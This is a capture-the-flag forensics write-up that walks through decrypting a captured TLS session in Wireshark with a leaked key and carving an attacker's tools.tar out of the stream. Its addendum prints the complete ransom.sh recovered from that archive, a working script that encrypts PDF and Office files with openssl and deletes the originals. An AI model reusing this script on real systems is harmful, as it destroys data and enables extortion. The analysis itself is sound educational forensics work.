# Task A2 - Identifying the attacker

<p align="center">
<img src="https://img.shields.io/badge/categories-Computer%20Forensics%2C%20Packet%20Analysis-informational">
<img src="https://img.shields.io/badge/points-40-success">
<img src="https://img.shields.io/badge/tools-Wireshark-blueviolet">
</p>

> Using the timestamp and IP address information from the VPN log, the FBI was able to identify a virtual server that the attacker used for staging their attack. They were able to obtain a warrant to search the server, but key files used in the attack were deleted.
>
> Luckily, the company uses an intrusion detection system which stores packet logs. They were able to find an SSL session going to the staging server, and believe it may have been the attacker transferring over their tools.
>
> The FBI hopes that these tools may provide a clue to the attacker's identity
>
> Downloads:
>
> - [Files captured from root's home directory on the staging server (root.tar.bz2)](./provided/root.tar.bz2)
> - [PCAP file believed to be of the attacker downloading their tools (session.pcap)](./provided/session.pcap)
>
> Prompt:
>
> - What was the username of the account the attacker used when they built their tools?

## Solution

The first thing I did was extract the contents of `root.tar.bz2`. The most interesting files from there were [`.bash_history`](./root-extracted/.bash_history), [`.cert.pem`](./root-extracted/.cert.pem), and [`runwww.py`](./root-extracted/runwww.py). From `.bash_history`, I saw that the attacker extracted what were presumably their ransomware tools and ran `runwww.py`, which starts an HTTP TLS server using OpenSSL. As part of running that server, the script generates a certificate and stores it in `.cert.pem`, which luckily the attacker never deleted. Using Wireshark, we can actually use this certificate to decrypte the TLS traffic going through the staging server as captured in [`session.pcap`](./provided/session.pcap).

After opening up the packet capture in Wireshark, I followed [a guide on its wiki](https://wiki.wireshark.org/TLS#tls-decryption) to add the RSA private key in `.cert.pem` to allow the TLS traffic to be decrypted. This was the result after doing so:

<div align="center">
    <img src="./img/packet%20capture%20post-decryption.png" alt="Wireshark after decrypting the TLS traffic">
</div>

The GET request doesn't contain anything interesting, so I decided to check out the first packet labeled "TLS segment of a reassembled PDU:"

<div align="center">
    <img src="./img/decrypted%20contents%20of%20first%20reassembled%20PDU.png" alt="Decrypted contents of first reassembled TLS PDU">
</div>

`AheadProudGlut` doesn't really sound like a username but I decided to submit it anyways and it ended up being correct. Not so sure who came up with that username :)

## Addendum: Recovering tools.tar

I stopped there when I initially did this task, but it turns out you actually need to recover `tools.tar` (or at least part of it) from the packet capture for a later task. It took me a while to figure out how to do this but it turns out it's way easier than I though. First, you have to right click on the `GET /tools.tar HTTP/1.1` packet in Wireshark and click Follow -> TLS stream in the context menu:

<div align="center">
    <img src="./img/follow%20tls%20stream.png" alt="Following a TLS stream in Wireshark">
</div>

After doing that, a window should pop up with the entirety of the decrypted data sent from the staging computer. In the bottom left, there should be a selector that says "Entire conversation" followed by the size of it in kilobytes; I changed this to `NONE:0 -> 172.16.0.1:57670` since I only really care about what the server sent to the computer, not the initial GET request. In the bottom right, you also have to change the "Show data as:" option to "Raw" in order for it to save properly, as otherwise the dot characters are saved as periods instead of the proper bytes. After doing that, you can save the stream to a file.

<div align="center">
    <img src="./img/raw%20decrypted%20tls%20stream.png" alt="Raw decrypted TLS stream">
</div>

My saved TLS stream is located [here](./tool-recovery/decrypted-tls-stream). Note that you also have to wait a bit for Wireshark to finish reassembling the stream (i.e. the number of packets in the bottom left stops increasing), as otherwise you won't be downloading the full stream and will end up with a corrupted tar archive.

From there, the downloaded stream is still not a valid tar file:

```shell
$ xxd -l 64 decrypted-tls-stream
00000000: 4854 5450 2f31 2e30 2032 3030 206f 6b0d  HTTP/1.0 200 ok.
00000010: 0a43 6f6e 7465 6e74 2d74 7970 653a 2074  .Content-type: t
00000020: 6578 742f 706c 6169 6e0d 0a0d 0a74 6f6f  ext/plain....too
00000030: 6c73 2f00 0000 0000 0000 0000 0000 0000  ls/.............
```

Each file entry in a tar starts with the name of the file, so I assumed that the `HTTP/1.0...` section of the TLS stream has to be removed, leaving `tools/` as the first few bytes of the file. Based on the `xxd` output, `tools/` has an offset of 0x2d bytes from the beginning of the file, which in decimal is 45 bytes. The [`tail(1)`](https://www.man7.org/linux/man-pages/man1/tail.1.html) command present on most Unix derivatives allows us to truncate the beginning of the file to the desired position:

```shell
$ tail -c +46 decrypted-tls-stream > tools.tar

$ xxd -l 64 tools.tar
00000000: 746f 6f6c 732f 0000 0000 0000 0000 0000  tools/..........
00000010: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000020: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000030: 0000 0000 0000 0000 0000 0000 0000 0000  ................
```

Note that we use an offset of 46 because the t in "tools/" is the 46th byte of the file (`xxd` starts counting bytes at 0, `tail` starts at 1).

If all went well, should now be able to use the [`tar(1)`](https://man7.org/linux/man-pages/man1/tar.1.html) command to extract the `tools.tar` archive:

```shell
$ tar -xvf tools.tar
```

And boom! There should be three files in the [`tools/`](./tool-recovery/tools/) directory:

1. `openssl` - OpenSSL is a common cryptography library; this binary encompasses a lot of operations available through that library (encryption/decryption are the relevant ones)
1. `busybox` - a single binary implementing several common Linux commands (e.g. `ls`, `xxd`, and `head`)
1. `ransom.sh` - presumably the script the attacker used to encrypt the victim's files (!)

The two binaries are statically linked (i.e. all necessary libraries are included within the binaries), so I assume they're included in case the victim doesn't have them installed for some reason.

I'll include the contents of `ransom.sh` here:

```sh
#!/bin/sh
read -p "Enter encryption key: " key
hexkey=`echo -n $key | ./busybox xxd -p | ./busybox head -c 32`
export hexkey
./busybox find $1 -regex '.*\.\(pdf\|doc\|docx\|xls\|xlsx\|ppt\|pptx\)' -print -exec sh -c 'iv=`./openssl rand -hex 16`; echo -n $iv > $0.enc; ./openssl enc -e -aes-128-cbc -K $hexkey -iv $iv -in $0 >> $0.enc; rm $0' \{\} \; 2>/dev/null
```

In English, this script:

1. Reads an encryption key from standard input (i.e. the terminal)
1. Converts the key into a hexadecimal representation of the ASCII version of the key and take the first 32 characters (16 bytes/ASCII characters) of that
1. Iterates over all PDF/Microsoft Office files, encrypting them via the following steps:
   1. Generate a random 16-byte IV (in hexadecimal representation)
   1. Write the IV to a file with the name \<filename>.enc, where \<filename> is the file being encrypted
   1. Encrypt the file using the random IV and the key from step 2 using the AES-128 algorithm in CBC mode
   1. Remove the original (unencrypted) file

You can read more about [the AES algorithm](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard) and [its modes of operation](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Common_modes) on Wikipedia (or elsewhere) if you're curious, but that information isn't really relevant until tasks 8 and 9. I'll attempt to explain it a bit more in the writeups for those tasks :)
